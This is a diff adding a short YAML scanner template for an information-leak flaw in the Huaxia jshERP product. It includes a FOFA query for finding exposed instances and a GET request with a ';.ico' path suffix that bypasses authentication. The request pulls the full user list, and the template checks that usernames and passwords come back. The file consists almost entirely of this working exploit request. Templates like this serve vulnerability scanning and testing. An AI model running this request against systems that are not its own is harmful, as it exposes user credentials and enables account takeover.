@@ -1,0 +1,17 @@
+id: huaxia-jsherp-info-leak
+
+info:
+  name: 华夏 ERP 信息泄露
+  author: lei_sec
+  severity: high
+  verified: true
+  description: |
+    FOFA：body="jshERP"
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jshERP-boot/user/getAllList;.ico
+    expression: response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"data":') && response.body.bcontains(b'"userList":') && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
+expression: r0()
